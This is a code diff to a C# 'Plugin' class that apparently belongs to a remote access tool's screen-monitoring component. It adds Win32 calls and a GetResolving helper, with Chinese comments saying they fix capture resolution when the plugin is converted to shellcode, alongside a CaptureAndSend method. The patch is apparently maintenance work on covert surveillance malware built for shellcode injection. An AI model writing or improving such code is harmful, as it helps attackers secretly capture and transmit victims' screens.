@@ -17,6 +17,23 @@ namespace Plugin
 {
     public static class Packet
     {
+        /*
+        * 修复转为shellcode时屏幕监控分辨率问题
+        * 增加GetDeviceCaps、GetDC、ReleaseDC的原生API
+        */
+
+        [DllImport("gdi32.dll")]
+        public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+
+        [DllImport("User32.dll", EntryPoint = "ReleaseDC")]
+        public extern static int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+        [DllImport("User32.dll", EntryPoint = "GetDC")]
+        public extern static IntPtr GetDC(IntPtr hWnd);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        internal static extern IntPtr LoadLibrary(string lpFileName);
+
         public static bool IsOk { get; set; }
         public static void Read(object data)
         {
@@ -66,6 +83,34 @@ namespace Plugin
                     }
             }
         }
+
+        /*
+         * 修复远程桌面分辨率问题
+         * 增加相关常量
+         */
+
+        private const int DESKTOPVERTRES = 117;
+        private const int DESKTOPHORZRES = 118;
+        private const int SM_CXSCREEN = 0;
+        private const int SM_CYSCREEN = 1;
+
+
+
+        private const int SRCCOPY = 0x00CC0020;
+
+        /*
+         * 修复转为shellcode时屏幕监控分辨率问题
+         * 增加GetResolving函数，用于获取屏幕分辨率
+         */
+
+        private static void GetResolving(ref int width, ref int height)
+        {
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            width = GetDeviceCaps(hdc, DESKTOPHORZRES);
+            height = GetDeviceCaps(hdc, DESKTOPVERTRES);
+            ReleaseDC(IntPtr.Zero, hdc);
+        }
+
 
         public static void CaptureAndSend(int quality, int Scrn)
         {
@@ -122,6 +167,18 @@ namespace Plugin
         private static Bitmap GetScreen(int Scrn)
         {
             Rectangle rect = Screen.AllScreens[Scrn].Bounds;
+
+           /*
+           * 修复转为shellcode时屏幕监控分辨率问题
+           * 获取修复的屏幕分辨率并替换
+           */
+
+            int width = 0;
+            int height = 0;
+            GetResolving(ref width, ref height);
+            rect.Width = width;
+            rect.Height = height;
+
             try
             {
                 Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
